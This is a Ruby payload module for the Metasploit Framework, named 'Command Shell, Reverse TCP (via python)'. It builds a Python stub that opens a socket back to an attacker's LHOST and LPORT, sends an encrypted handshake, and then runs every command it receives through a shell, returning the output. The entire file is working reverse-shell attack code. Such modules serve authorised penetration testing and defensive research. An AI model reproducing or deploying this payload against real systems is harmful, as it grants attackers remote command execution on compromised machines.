##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Payload::Python
  include Msf::Sessions::CommandShellOptions
  include Rex::Crypto

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Command Shell, Reverse TCP (via python)',
        'Description' => 'Creates an interactive shell via Python, encodes with base64 by design. Compatible with Python 2.4-2.7 and 3.4+.',
        'Author' => [
          'Ben Campbell', # Based on RageLtMan's reverse_ssl
          'Siras'
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'python',
        'Arch' => ARCH_PYTHON,
        'Handler' => Msf::Handler::MagicReverseTcp,
        'Session' => Msf::Sessions::CommandShell,
        'PayloadType' => 'python',
        'Payload' => {
          'Offsets' => {},
          'Payload' => ''
        }
      )
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    iconn = datastore['IHOST']
    iconn += ':'
    iconn += datastore['IPORT']
    n = rand(7...50)
    r = Random.new.bytes(n - n % 4)

    magic = r
    magic += Aes256.encrypt_aes256(datastore['IV'], datastore['KEY'], iconn)

    cmd = <<~PYTHON
      import socket as s
      import base64
      import subprocess as r
      so=s.socket(s.AF_INET,s.SOCK_STREAM)
      so.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))
      so.send(base64.b64decode('#{Base64.strict_encode64(magic)}'))
      while True:
      	d=so.recv(1024)
      	if len(d)==0:
      		break
      	p=r.Popen(d,shell=True,stdin=r.PIPE,stdout=r.PIPE,stderr=r.PIPE)
      	o=p.stdout.read()+p.stderr.read()
      	so.send(o)
    PYTHON

    py_create_exec_stub(cmd)
  end
end
